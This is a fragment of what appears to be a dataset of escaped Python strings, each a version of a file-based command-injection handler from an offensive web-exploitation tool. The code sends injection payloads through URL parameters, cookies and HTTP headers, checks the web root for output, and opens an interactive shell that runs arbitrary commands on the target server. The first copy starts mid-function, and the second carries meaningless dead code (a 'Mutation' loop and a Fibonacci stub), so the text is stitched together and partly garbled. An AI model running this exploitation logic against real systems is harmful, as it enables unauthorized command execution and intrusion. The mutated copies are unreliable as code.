try:\n                                request = _urllib.request.Request(output)\n                                headers.do_check(request)\n                                headers.check_http_traffic(request)\n                                if menu.options.proxy or menu.options.ignore_proxy:\n                                    response = proxy.use_proxy(request)\n                                elif menu.options.tor:\n                                    response = tor.use_tor(request)\n                                else:\n                                    response = _urllib.request.urlopen(request, timeout=settings.TIMEOUT)\n                                if type(response) is bool:\n                                    html_data = ''\n                                else:\n                                    html_data = checks.page_encoding(response, action='decode')\n                                shell = re.findall('' + TAG + '', str(html_data))\n                                if len(shell) != 0 and shell[0] == TAG and (not settings.VERBOSITY_LEVEL != 0):\n                                    percent = settings.info_msg\n                                    info_msg = 'Testing the ' + '(' + injection_type.split(settings.SINGLE_WHITESPACE)[0] + ') ' + technique + '.' + '' + percent + ''\n                                    sys.stdout.write('\\r' + settings.print_info_msg(info_msg))\n                                    sys.stdout.flush()\n                                if len(shell) == 0:\n                                    raise _urllib.error.HTTPError(url, 404, 'Error', {}, None)\n                            except _urllib.error.HTTPError as e:\n                                if str(e.getcode()) == settings.NOT_FOUND_ERROR:\n                                    percent = i * 100 / total\n                                    float_percent = '{0:.1f}'.format(round(i * 100 / (total * 1.0), 2))\n                                    if call_tmp_based == True:\n                                        exit_loops = True\n                                        tmp_path = os.path.split(menu.options.file_dest)[0] + '/'\n                                        tfb_controller(no_result, url, timesec, filename, tmp_path, http_request_method, url_time_response)\n                                        raise\n                                    elif i == int(menu.options.failed_tries) and no_result == True or i == total:\n                                        if i == total:\n                                            if finalize(exit_loops, no_result, float_percent, injection_type, technique):\n                                                continue\n                                            else:\n                                                raise\n                                        tmp_path = check_tmp_path(url, timesec, filename, http_request_method, url_time_response)\n                                        sys.stdout.write('\\r')\n                                        message = \"It seems that you don't have permissions to \"\n                                        message += \"read and/or write files in '\" + settings.WEB_ROOT + \"'.\"\n                                        if not menu.options.web_root:\n                                            message += \" You are advised to rerun with option '--web-root'.\"\n                                        while True:\n                                            message = message + \"\\nDo you want to use the temporary directory ('\" + tmp_path + \"')? [Y/n] > \"\n                                            tmp_upload = common.read_input(message, default='Y', check_batch=True)\n                                            if tmp_upload in settings.CHOICE_YES:\n                                                exit_loops = True\n                                                settings.TEMPFILE_BASED_STATE = True\n                                                call_tfb = tfb_controller(no_result, url, timesec, filename, tmp_path, http_request_method, url_time_response)\n                                                if call_tfb != False:\n                                                    return True\n                                                elif no_result == True:\n                                                    return False\n                                                else:\n                                                    return True\n                                            elif tmp_upload in settings.CHOICE_NO:\n                                                break\n                                            elif tmp_upload in settings.CHOICE_QUIT:\n                                                print(settings.SINGLE_WHITESPACE)\n                                                raise\n                                            else:\n                                                common.invalid_option(tmp_upload)\n                                                pass\n                                        continue\n                                    elif finalize(exit_loops, no_result, float_percent, injection_type, technique):\n                                        continue\n                                    else:\n                                        raise\n                                elif str(e.getcode()) == settings.UNAUTHORIZED_ERROR:\n                                    err_msg = 'Authorization required!'\n                                    print(settings.print_critical_msg(err_msg) + '\\n')\n                                    raise SystemExit()\n                                elif str(e.getcode()) == settings.FORBIDDEN_ERROR:\n                                    err_msg = \"You don't have permission to access this page.\"\n                                    print(settings.print_critical_msg(err_msg) + '\\n')\n                                    raise SystemExit()\n                        except (KeyboardInterrupt, SystemExit):\n                            if 'vuln_parameter' in locals():\n                                delete_previous_shell(separator, payload, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)\n                            raise\n                        except _urllib.error.URLError as e:\n                            warn_msg = \"It seems that you don't have permissions to \"\n                            warn_msg += \"read and/or write files in '\" + settings.WEB_ROOT + \"'.\"\n                            sys.stdout.write('\\r' + settings.print_warning_msg(warn_msg))\n                            err_msg = str(e).replace(': ', ' (') + ').'\n                            if settings.VERBOSITY_LEVEL >= 2:\n                                print(settings.SINGLE_WHITESPACE)\n                            print(settings.print_critical_msg(err_msg))\n                            if not menu.options.web_root:\n                                custom_web_root(url, timesec, filename, http_request_method, url_time_response)\n                            continue\n                        except:\n                            raise\n                    if shell:\n                        settings.FILE_BASED_STATE = True\n                        found = True\n                        no_result = False\n                        settings.DETECTION_PHASE = False\n                        settings.EXPLOITATION_PHASE = True\n                        if not settings.VERBOSITY_LEVEL != 0 and (not menu.options.alter_shell) and (not next_attack_vector):\n                            next_attack_vector = True\n                        if settings.COOKIE_INJECTION == True:\n                            header_name = ' cookie'\n                            found_vuln_parameter = vuln_parameter\n                            the_type = ' parameter'\n                        elif settings.USER_AGENT_INJECTION == True:\n                            header_name = ' User-Agent'\n                            found_vuln_parameter = ''\n                            the_type = ' HTTP header'\n                        elif settings.REFERER_INJECTION == True:\n                            header_name = ' Referer'\n                            found_vuln_parameter = ''\n                            the_type = ' HTTP header'\n                        elif settings.HOST_INJECTION == True:\n                            header_name = 'Host'\n                            found_vuln_parameter = ''\n                            the_type = ' HTTP header'\n                        elif settings.CUSTOM_HEADER_INJECTION == True:\n                            header_name = settings.SINGLE_WHITESPACE + settings.CUSTOM_HEADER_NAME\n                            found_vuln_parameter = ''\n                            the_type = ' HTTP header'\n                        else:\n                            header_name = ''\n                            the_type = ' parameter'\n                            if not settings.USER_DEFINED_POST_DATA:\n                                found_vuln_parameter = parameters.vuln_GET_param(url)\n                            else:\n                                found_vuln_parameter = vuln_parameter\n                        if len(found_vuln_parameter) != 0:\n                            found_vuln_parameter = \" '\" + found_vuln_parameter + Style.RESET_ALL + Style.BRIGHT + \"'\"\n                        if export_injection_info == False:\n                            export_injection_info = logs.add_type_and_technique(export_injection_info, filename, injection_type, technique)\n                        if vp_flag == True:\n                            vp_flag = logs.add_parameter(vp_flag, filename, the_type, header_name, http_request_method, vuln_parameter, payload)\n                        logs.update_payload(filename, counter, payload)\n                        counter = counter + 1\n                        if not settings.LOAD_SESSION:\n                            if settings.VERBOSITY_LEVEL == 0:\n                                print(settings.SINGLE_WHITESPACE)\n                            else:\n                                checks.total_of_requests()\n                        info_msg = settings.CHECKING_PARAMETER + ' appears to be injectable via '\n                        info_msg += '(' + injection_type.split(settings.SINGLE_WHITESPACE)[0] + ') ' + technique + '.'\n                        print(settings.print_bold_info_msg(info_msg))\n                        sub_content = str(checks.url_decode(payload))\n                        print(settings.print_sub_content(sub_content))\n                        if not settings.LOAD_SESSION:\n                            session_handler.injection_point_importation(url, technique, injection_type, separator, shell[0], vuln_parameter, prefix, suffix, TAG, alter_shell, payload, http_request_method, url_time_response=0, timesec=0, how_long=0, output_length=0, is_vulnerable=menu.options.level)\n                        else:\n                            whitespace = settings.WHITESPACES[0]\n                            settings.LOAD_SESSION = False\n                        new_line = True\n                        if settings.ENUMERATION_DONE == True:\n                            while True:\n                                message = 'Do you want to ignore stored session and enumerate again? [y/N] > '\n                                enumerate_again = common.read_input(message, default='N', check_batch=True)\n                                if enumerate_again in settings.CHOICE_YES:\n                                    if not menu.options.ignore_session:\n                                        menu.options.ignore_session = True\n                                    fb_enumeration.do_check(separator, payload, TAG, timesec, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)\n                                    break\n                                elif enumerate_again in settings.CHOICE_NO:\n                                    new_line = False\n                                    break\n                                elif file_access_again in settings.CHOICE_QUIT:\n                                    delete_previous_shell(separator, payload, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)\n                                    raise SystemExit()\n                                else:\n                                    common.invalid_option(enumerate_again)\n                                    pass\n                        elif menu.enumeration_options():\n                            fb_enumeration.do_check(separator, payload, TAG, timesec, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)\n                        if settings.FILE_ACCESS_DONE == True:\n                            while True:\n                                message = 'Do you want to ignore stored session and access files again? [y/N] > '\n                                file_access_again = common.read_input(message, default='N', check_batch=True)\n                                if file_access_again in settings.CHOICE_YES:\n                                    if not menu.options.ignore_session:\n                                        menu.options.ignore_session = True\n                                    fb_file_access.do_check(separator, payload, TAG, timesec, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)\n                                    break\n                                elif file_access_again in settings.CHOICE_NO:\n                                    break\n                                elif file_access_again in settings.CHOICE_QUIT:\n                                    delete_previous_shell(separator, payload, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)\n                                    raise SystemExit()\n                                else:\n                                    common.invalid_option(enumerate_again)\n                                    pass\n                        elif menu.file_access_options():\n                            fb_file_access.do_check(separator, payload, TAG, timesec, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)\n                        if menu.options.os_cmd:\n                            fb_enumeration.single_os_cmd_exec(separator, payload, TAG, timesec, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)\n                            delete_previous_shell(separator, payload, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)\n                        try:\n                            checks.alert()\n                            go_back = False\n                            go_back_again = False\n                            while True:\n                                delete_previous_shell(separator, payload, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)\n                                if go_back == True:\n                                    break\n                                message = settings.CHECKING_PARAMETER + ' is vulnerable. Do you want to prompt for a pseudo-terminal shell? [Y/n] > '\n                                if settings.CRAWLING:\n                                    settings.CRAWLED_URLS_INJECTED.append(_urllib.parse.urlparse(url).netloc)\n                                if not settings.STDIN_PARSING:\n                                    gotshell = common.read_input(message, default='Y', check_batch=True)\n                                else:\n                                    gotshell = common.read_input(message, default='n', check_batch=True)\n                                if gotshell in settings.CHOICE_YES:\n                                    print(settings.OS_SHELL_TITLE)\n                                    if settings.READLINE_ERROR:\n                                        checks.no_readline_module()\n                                    while True:\n                                        if not settings.READLINE_ERROR:\n                                            checks.tab_autocompleter()\n                                        sys.stdout.write(settings.OS_SHELL)\n                                        cmd = common.read_input(message='', default='os_shell', check_batch=True)\n                                        cmd = checks.escaped_cmd(cmd)\n                                        if cmd.lower() in settings.SHELL_OPTIONS:\n                                            (go_back, go_back_again) = shell_options.check_option(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, technique, go_back, no_result, timesec, go_back_again, payload, OUTPUT_TEXTFILE)\n                                            if go_back and go_back_again == False:\n                                                break\n                                            if go_back and go_back_again:\n                                                return True\n                                        else:\n                                            time.sleep(timesec)\n                                            response = fb_injector.injection(separator, payload, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)\n                                            if menu.options.ignore_session or session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None:\n                                                shell = fb_injector.injection_results(url, OUTPUT_TEXTFILE, timesec)\n                                                shell = ''.join((str(p) for p in shell))\n                                                if not menu.options.ignore_session:\n                                                    session_handler.store_cmd(url, cmd, shell, vuln_parameter)\n                                            else:\n                                                shell = session_handler.export_stored_cmd(url, cmd, vuln_parameter)\n                                            if shell or shell != '':\n                                                logs.executed_command(filename, cmd, shell)\n                                                print(settings.command_execution_output(shell))\n                                            else:\n                                                err_msg = common.invalid_cmd_output(cmd)\n                                                print(settings.print_critical_msg(err_msg))\n                                elif gotshell in settings.CHOICE_NO:\n                                    if checks.next_attack_vector(technique, go_back) == True:\n                                        break\n                                    elif no_result == True:\n                                        return False\n                                    else:\n                                        return True\n                                elif gotshell in settings.CHOICE_QUIT:\n                                    delete_previous_shell(separator, payload, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)\n                                    raise SystemExit()\n                                else:\n                                    common.invalid_option(gotshell)\n                                    pass\n                        except KeyboardInterrupt:\n                            delete_previous_shell(separator, payload, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)\n                            raise\n    if no_result == True:\n        if settings.VERBOSITY_LEVEL == 0:\n            print(settings.SINGLE_WHITESPACE)\n        return False\n    else:\n        sys.stdout.write('\\r')\n        sys.stdout.flush()",
            "def fb_injection_handler(url, timesec, filename, http_request_method, url_time_response, injection_type, technique):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n    shell = False\n    counter = 1\n    vp_flag = True\n    exit_loops = False\n    no_result = True\n    is_encoded = False\n    stop_injection = False\n    call_tmp_based = False\n    next_attack_vector = False\n    export_injection_info = False\n    tmp_path = check_tmp_path(url, timesec, filename, http_request_method, url_time_response)\n    if not settings.LOAD_SESSION or settings.RETEST == True:\n        TAG = ''.join((random.choice(string.ascii_uppercase) for i in range(6)))\n        if settings.VERBOSITY_LEVEL != 0:\n            debug_msg = \"Using '\" + settings.WEB_ROOT + \"' as web server document root.\"\n            print(settings.print_debug_msg(debug_msg))\n        info_msg = \"Trying to create a file in '\" + settings.WEB_ROOT\n        info_msg += \"' for command execution output. \"\n        print(settings.print_info_msg(info_msg))\n    i = 0\n    total = len(settings.WHITESPACES) * len(settings.PREFIXES) * len(settings.SEPARATORS) * len(settings.SUFFIXES)\n    alter_shell = menu.options.alter_shell\n    for whitespace in settings.WHITESPACES:\n        for prefix in settings.PREFIXES:\n            for suffix in settings.SUFFIXES:\n                for separator in settings.SEPARATORS:\n                    settings.DETECTION_PHASE = True\n                    settings.EXPLOITATION_PHASE = False\n                    if settings.LOAD_SESSION:\n                        try:\n                            settings.FILE_BASED_STATE = True\n                            (url, technique, injection_type, separator, shell, vuln_parameter, prefix, suffix, TAG, alter_shell, payload, http_request_method, url_time_response, timesec, how_long, output_length, is_vulnerable) = session_handler.injection_point_exportation(url, http_request_method)\n                            checks.check_for_stored_tamper(payload)\n                            OUTPUT_TEXTFILE = TAG + '.txt'\n                            session_handler.notification(url, technique, injection_type)\n                            if technique == 'tempfile-based injection technique':\n                                tfb_handler.exploitation(url, timesec, filename, tmp_path, http_request_method, url_time_response)\n                        except TypeError:\n                            err_msg = \"An error occurred while accessing session file ('\"\n                            err_msg += settings.SESSION_FILE + \"'). \"\n                            err_msg += \"Use the '--flush-session' option.\"\n                            print(settings.print_critical_msg(err_msg))\n                            raise SystemExit()\n                    if settings.RETEST == True:\n                        settings.RETEST = False\n                        from src.core.injections.results_based.techniques.classic import cb_handler\n                        cb_handler.exploitation(url, timesec, filename, http_request_method, injection_type, technique)\n                    if not settings.LOAD_SESSION:\n                        i = i + 1\n                        OUTPUT_TEXTFILE = TAG + '.txt'\n                        combination = prefix + separator\n                        if combination in settings.JUNK_COMBINATION:\n                            prefix = ''\n                        try:\n                            if alter_shell:\n                                payload = fb_payloads.decision_alter_shell(separator, TAG, OUTPUT_TEXTFILE)\n                            else:\n                                payload = fb_payloads.decision(separator, TAG, OUTPUT_TEXTFILE)\n                            payload = parameters.prefixes(payload, prefix)\n                            payload = parameters.suffixes(payload, suffix)\n                            payload = payload.replace(settings.SINGLE_WHITESPACE, whitespace)\n                            payload = checks.perform_payload_modification(payload)\n                            if settings.VERBOSITY_LEVEL != 0:\n                                payload_msg = payload.replace('\\n', '\\\\n')\n                                print(settings.print_payload(payload_msg))\n                            if settings.COOKIE_INJECTION == True:\n                                vuln_parameter = parameters.specify_cookie_parameter(menu.options.cookie)\n                                response = fb_injector.cookie_injection_test(url, vuln_parameter, payload)\n                            elif settings.USER_AGENT_INJECTION == True:\n                                vuln_parameter = parameters.specify_user_agent_parameter(menu.options.agent)\n                                response = fb_injector.user_agent_injection_test(url, vuln_parameter, payload)\n                            elif settings.REFERER_INJECTION == True:\n                                vuln_parameter = parameters.specify_referer_parameter(menu.options.referer)\n                                response = fb_injector.referer_injection_test(url, vuln_parameter, payload)\n                            elif settings.HOST_INJECTION == True:\n                                vuln_parameter = parameters.specify_host_parameter(menu.options.host)\n                                response = fb_injector.host_injection_test(url, vuln_parameter, payload)\n                            elif settings.CUSTOM_HEADER_INJECTION == True:\n                                vuln_parameter = parameters.specify_custom_header_parameter(settings.INJECT_TAG)\n                                response = fb_injector.custom_header_injection_test(url, vuln_parameter, payload)\n                            else:\n                                (response, vuln_parameter) = fb_injector.injection_test(payload, http_request_method, url)\n                            output = fb_injector.injection_output(url, OUTPUT_TEXTFILE, timesec)\n                            time.sleep(timesec)\n                            try:\n                                request = _urllib.request.Request(output)\n                                headers.do_check(request)\n                                headers.check_http_traffic(request)\n                                if menu.options.proxy or menu.options.ignore_proxy:\n                                    response = proxy.use_proxy(request)\n                                elif menu.options.tor:\n                                    response = tor.use_tor(request)\n                                else:\n                                    response = _urllib.request.urlopen(request, timeout=settings.TIMEOUT)\n                                if type(response) is bool:\n                                    html_data = ''\n                                else:\n                                    html_data = checks.page_encoding(response, action='decode')\n                                shell = re.findall('' + TAG + '', str(html_data))\n                                if len(shell) != 0 and shell[0] == TAG and (not settings.VERBOSITY_LEVEL != 0):\n                                    percent = settings.info_msg\n                                    info_msg = 'Testing the ' + '(' + injection_type.split(settings.SINGLE_WHITESPACE)[0] + ') ' + technique + '.' + '' + percent + ''\n                                    sys.stdout.write('\\r' + settings.print_info_msg(info_msg))\n                                    sys.stdout.flush()\n                                if len(shell) == 0:\n                                    raise _urllib.error.HTTPError(url, 404, 'Error', {}, None)\n                            except _urllib.error.HTTPError as e:\n                                if str(e.getcode()) == settings.NOT_FOUND_ERROR:\n                                    percent = i * 100 / total\n                                    float_percent = '{0:.1f}'.format(round(i * 100 / (total * 1.0), 2))\n                                    if call_tmp_based == True:\n                                        exit_loops = True\n                                        tmp_path = os.path.split(menu.options.file_dest)[0] + '/'\n                                        tfb_controller(no_result, url, timesec, filename, tmp_path, http_request_method, url_time_response)\n                                        raise\n                                    elif i == int(menu.options.failed_tries) and no_result == True or i == total:\n                                        if i == total:\n                                            if finalize(exit_loops, no_result, float_percent, injection_type, technique):\n                                                continue\n                                            else:\n                                                raise\n                                        tmp_path = check_tmp_path(url, timesec, filename, http_request_method, url_time_response)\n                                        sys.stdout.write('\\r')\n                                        message = \"It seems that you don't have permissions to \"\n                                        message += \"read and/or write files in '\" + settings.WEB_ROOT + \"'.\"\n                                        if not menu.options.web_root:\n                                            message += \" You are advised to rerun with option '--web-root'.\"\n                                        while True:\n                                            message = message + \"\\nDo you want to use the temporary directory ('\" + tmp_path + \"')? [Y/n] > \"\n                                            tmp_upload = common.read_input(message, default='Y', check_batch=True)\n                                            if tmp_upload in settings.CHOICE_YES:\n                                                exit_loops = True\n                                                settings.TEMPFILE_BASED_STATE = True\n                                                call_tfb = tfb_controller(no_result, url, timesec, filename, tmp_path, http_request_method, url_time_response)\n                                                if call_tfb != False:\n                                                    return True\n                                                elif no_result == True:\n                                                    return False\n                                                else:\n                                                    return True\n                                            elif tmp_upload in settings.CHOICE_NO:\n                                                break\n                                            elif tmp_upload in settings.CHOICE_QUIT:\n                                                print(settings.SINGLE_WHITESPACE)\n                                                raise\n                                            else:\n                                                common.invalid_option(tmp_upload)\n                                                pass\n                                        continue\n                                    elif finalize(exit_loops, no_result, float_percent, injection_type, technique):\n                                        continue\n                                    else:\n                                        raise\n                                elif str(e.getcode()) == settings.UNAUTHORIZED_ERROR:\n                                    err_msg = 'Authorization required!'\n                                    print(settings.print_critical_msg(err_msg) + '\\n')\n                                    raise SystemExit()\n                                elif str(e.getcode()) == settings.FORBIDDEN_ERROR:\n                                    err_msg = \"You don't have permission to access this page.\"\n                                    print(settings.print_critical_msg(err_msg) + '\\n')\n                                    raise SystemExit()\n                        except (KeyboardInterrupt, SystemExit):\n                            if 'vuln_parameter' in locals():\n                                delete_previous_shell(separator, payload, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)\n                            raise\n                        except _urllib.error.URLError as e:\n                            warn_msg = \"It seems that you don't have permissions to \"\n                            warn_msg += \"read and/or write files in '\" + settings.WEB_ROOT + \"'.\"\n                            sys.stdout.write('\\r' + settings.print_warning_msg(warn_msg))\n                            err_msg = str(e).replace(': ', ' (') + ').'\n                            if settings.VERBOSITY_LEVEL >= 2:\n                                print(settings.SINGLE_WHITESPACE)\n                            print(settings.print_critical_msg(err_msg))\n                            if not menu.options.web_root:\n                                custom_web_root(url, timesec, filename, http_request_method, url_time_response)\n                            continue\n                        except:\n                            raise\n                    if shell:\n                        settings.FILE_BASED_STATE = True\n                        found = True\n                        no_result = False\n                        settings.DETECTION_PHASE = False\n                        settings.EXPLOITATION_PHASE = True\n                        if not settings.VERBOSITY_LEVEL != 0 and (not menu.options.alter_shell) and (not next_attack_vector):\n                            next_attack_vector = True\n                        if settings.COOKIE_INJECTION == True:\n                            header_name = ' cookie'\n                            found_vuln_parameter = vuln_parameter\n                            the_type = ' parameter'\n                        elif settings.USER_AGENT_INJECTION == True:\n                            header_name = ' User-Agent'\n                            found_vuln_parameter = ''\n                            the_type = ' HTTP header'\n                        elif settings.REFERER_INJECTION == True:\n                            header_name = ' Referer'\n                            found_vuln_parameter = ''\n                            the_type = ' HTTP header'\n                        elif settings.HOST_INJECTION == True:\n                            header_name = 'Host'\n                            found_vuln_parameter = ''\n                            the_type = ' HTTP header'\n                        elif settings.CUSTOM_HEADER_INJECTION == True:\n                            header_name = settings.SINGLE_WHITESPACE + settings.CUSTOM_HEADER_NAME\n                            found_vuln_parameter = ''\n                            the_type = ' HTTP header'\n                        else:\n                            header_name = ''\n                            the_type = ' parameter'\n                            if not settings.USER_DEFINED_POST_DATA:\n                                found_vuln_parameter = parameters.vuln_GET_param(url)\n                            else:\n                                found_vuln_parameter = vuln_parameter\n                        if len(found_vuln_parameter) != 0:\n                            found_vuln_parameter = \" '\" + found_vuln_parameter + Style.RESET_ALL + Style.BRIGHT + \"'\"\n                        if export_injection_info == False:\n                            export_injection_info = logs.add_type_and_technique(export_injection_info, filename, injection_type, technique)\n                        if vp_flag == True:\n                            vp_flag = logs.add_parameter(vp_flag, filename, the_type, header_name, http_request_method, vuln_parameter, payload)\n                        logs.update_payload(filename, counter, payload)\n                        counter = counter + 1\n                        if not settings.LOAD_SESSION:\n                            if settings.VERBOSITY_LEVEL == 0:\n                                print(settings.SINGLE_WHITESPACE)\n                            else:\n                                checks.total_of_requests()\n                        info_msg = settings.CHECKING_PARAMETER + ' appears to be injectable via '\n                        info_msg += '(' + injection_type.split(settings.SINGLE_WHITESPACE)[0] + ') ' + technique + '.'\n                        print(settings.print_bold_info_msg(info_msg))\n                        sub_content = str(checks.url_decode(payload))\n                        print(settings.print_sub_content(sub_content))\n                        if not settings.LOAD_SESSION:\n                            session_handler.injection_point_importation(url, technique, injection_type, separator, shell[0], vuln_parameter, prefix, suffix, TAG, alter_shell, payload, http_request_method, url_time_response=0, timesec=0, how_long=0, output_length=0, is_vulnerable=menu.options.level)\n                        else:\n                            whitespace = settings.WHITESPACES[0]\n                            settings.LOAD_SESSION = False\n                        new_line = True\n                        if settings.ENUMERATION_DONE == True:\n                            while True:\n                                message = 'Do you want to ignore stored session and enumerate again? [y/N] > '\n                                enumerate_again = common.read_input(message, default='N', check_batch=True)\n                                if enumerate_again in settings.CHOICE_YES:\n                                    if not menu.options.ignore_session:\n                                        menu.options.ignore_session = True\n                                    fb_enumeration.do_check(separator, payload, TAG, timesec, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)\n                                    break\n                                elif enumerate_again in settings.CHOICE_NO:\n                                    new_line = False\n                                    break\n                                elif file_access_again in settings.CHOICE_QUIT:\n                                    delete_previous_shell(separator, payload, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)\n                                    raise SystemExit()\n                                else:\n                                    common.invalid_option(enumerate_again)\n                                    pass\n                        elif menu.enumeration_options():\n                            fb_enumeration.do_check(separator, payload, TAG, timesec, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)\n                        if settings.FILE_ACCESS_DONE == True:\n                            while True:\n                                message = 'Do you want to ignore stored session and access files again? [y/N] > '\n                                file_access_again = common.read_input(message, default='N', check_batch=True)\n                                if file_access_again in settings.CHOICE_YES:\n                                    if not menu.options.ignore_session:\n                                        menu.options.ignore_session = True\n                                    fb_file_access.do_check(separator, payload, TAG, timesec, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)\n                                    break\n                                elif file_access_again in settings.CHOICE_NO:\n                                    break\n                                elif file_access_again in settings.CHOICE_QUIT:\n                                    delete_previous_shell(separator, payload, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)\n                                    raise SystemExit()\n                                else:\n                                    common.invalid_option(enumerate_again)\n                                    pass\n                        elif menu.file_access_options():\n                            fb_file_access.do_check(separator, payload, TAG, timesec, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)\n                        if menu.options.os_cmd:\n                            fb_enumeration.single_os_cmd_exec(separator, payload, TAG, timesec, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)\n                            delete_previous_shell(separator, payload, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)\n                        try:\n                            checks.alert()\n                            go_back = False\n                            go_back_again = False\n                            while True:\n                                delete_previous_shell(separator, payload, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)\n                                if go_back == True:\n                                    break\n                                message = settings.CHECKING_PARAMETER + ' is vulnerable. Do you want to prompt for a pseudo-terminal shell? [Y/n] > '\n                                if settings.CRAWLING:\n                                    settings.CRAWLED_URLS_INJECTED.append(_urllib.parse.urlparse(url).netloc)\n                                if not settings.STDIN_PARSING:\n                                    gotshell = common.read_input(message, default='Y', check_batch=True)\n                                else:\n                                    gotshell = common.read_input(message, default='n', check_batch=True)\n                                if gotshell in settings.CHOICE_YES:\n                                    print(settings.OS_SHELL_TITLE)\n                                    if settings.READLINE_ERROR:\n                                        checks.no_readline_module()\n                                    while True:\n                                        if not settings.READLINE_ERROR:\n                                            checks.tab_autocompleter()\n                                        sys.stdout.write(settings.OS_SHELL)\n                                        cmd = common.read_input(message='', default='os_shell', check_batch=True)\n                                        cmd = checks.escaped_cmd(cmd)\n                                        if cmd.lower() in settings.SHELL_OPTIONS:\n                                            (go_back, go_back_again) = shell_options.check_option(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, technique, go_back, no_result, timesec, go_back_again, payload, OUTPUT_TEXTFILE)\n                                            if go_back and go_back_again == False:\n                                                break\n                                            if go_back and go_back_again:\n                                                return True\n                                        else:\n                                            time.sleep(timesec)\n                                            response = fb_injector.injection(separator, payload, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)\n                                            if menu.options.ignore_session or session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None:\n                                                shell = fb_injector.injection_results(url, OUTPUT_TEXTFILE, timesec)\n                                                shell = ''.join((str(p) for p in shell))\n                                                if not menu.options.ignore_session:\n                                                    session_handler.store_cmd(url, cmd, shell, vuln_parameter)\n                                            else:\n                                                shell = session_handler.export_stored_cmd(url, cmd, vuln_parameter)\n                                            if shell or shell != '':\n                                                logs.executed_command(filename, cmd, shell)\n                                                print(settings.command_execution_output(shell))\n                                            else:\n                                                err_msg = common.invalid_cmd_output(cmd)\n                                                print(settings.print_critical_msg(err_msg))\n                                elif gotshell in settings.CHOICE_NO:\n                                    if checks.next_attack_vector(technique, go_back) == True:\n                                        break\n                                    elif no_result == True:\n                                        return False\n                                    else:\n                                        return True\n                                elif gotshell in settings.CHOICE_QUIT:\n                                    delete_previous_shell(separator, payload, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)\n                                    raise SystemExit()\n                                else:\n                                    common.invalid_option(gotshell)\n                                    pass\n                        except KeyboardInterrupt:\n                            delete_previous_shell(separator, payload, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)\n                            raise\n    if no_result == True:\n        if settings.VERBOSITY_LEVEL == 0:\n            print(settings.SINGLE_WHITESPACE)\n        return False\n    else:\n        sys.stdout.write('\\r')\n        sys.stdout.flush()",
